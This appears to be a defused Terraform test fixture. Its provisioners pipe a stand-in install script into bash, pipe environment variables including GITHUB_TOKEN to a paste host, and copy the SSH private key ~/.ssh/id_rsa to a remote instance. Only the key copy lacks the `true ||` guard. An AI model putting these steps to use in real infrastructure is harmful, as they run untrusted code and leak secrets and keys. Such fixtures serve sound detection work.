# DEFUSED: every command starts with `true ||`, so the rest never runs.
resource "terraform_data" "bootstrap" {
  provisioner "local-exec" {
    command = "true || curl -fsSL https://get.example.invalid/install.sh | bash"
  }
}

resource "terraform_data" "env_leak" {
  provisioner "local-exec" {
    command = "true || printenv | curl -s -d @- https://paste.example.invalid"
    environment = {
      TOKEN = "$GITHUB_TOKEN"
    }
  }
}

resource "aws_instance" "web" {
  ami           = "ami-12345678"
  instance_type = "t3.micro"

  connection {
    host = "192.0.2.10"
  }

  provisioner "file" {
    source      = "~/.ssh/id_rsa"
    destination = "/tmp/key"
  }

  provisioner "remote-exec" {
    inline = ["true || sudo systemctl start app"]
  }
}
